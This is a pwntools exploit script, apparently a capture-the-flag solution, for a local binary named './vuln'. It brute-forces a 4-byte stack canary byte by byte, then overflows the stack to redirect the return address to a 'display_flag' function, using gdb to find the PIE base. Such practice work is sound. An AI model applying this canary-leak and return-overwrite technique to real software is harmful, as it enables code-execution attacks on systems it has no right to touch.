#!/bin/python3

from pwn import *

# context.log_level = 'debug'
context.log_level = 'error'


canaryOffset = 0x58 - 0x38 # from gdb
retOffset = 0x6c - 0x5c


def getPIEMainAddress(p):
	g = gdb.attach(p, gdbscript=f'disas main')
	return int(input("Enter the main address in hex as given: "), 16)

def leakCanary():

	payload = b"A"*canaryOffset

	canary = b""

	payloadLen = canaryOffset

	for _ in range(4): # because there are 4 bytes
		payloadLen +=1
		for c in range(2**8):
			p = process('./vuln')
			p.recvuntil(b"> ")
			p.sendline(str.encode(str(payloadLen)))
			p.recvuntil(b"> ")
			p.send(payload + canary + str.encode(chr(c)))
			response = p.recv()
			p.close()
			if b"Smashing" not in response:
				canary += str.encode(chr(c))
				print(canary.decode() + "*"*(4-len(canary)))
				break
	return canary

def exploit(canary):
	e = ELF('./vuln')

	flagOut = b""
	p = process('./vuln')

	payload = b"A"*canaryOffset
	payload += canary
	payload += b"B"*retOffset

	pieBaseAddress = getPIEMainAddress(p) - e.sym['main']
	payload += p32(pieBaseAddress + e.sym['display_flag'])

	p.recvuntil(b"> ")
	p.sendline(str.encode(str(len(payload))))

	p.recvuntil(b"> ")
	p.send(payload)

	p.recvuntil(b"Flag?\n")

	try:
		flagOut = p.recv()
	except:
		p.close()


	print(flagOut.rstrip().decode("UTF-8"))


canary = leakCanary()
# canary = b'LjgH'
print(f'Found the canary: {canary}')
exploit(canary)
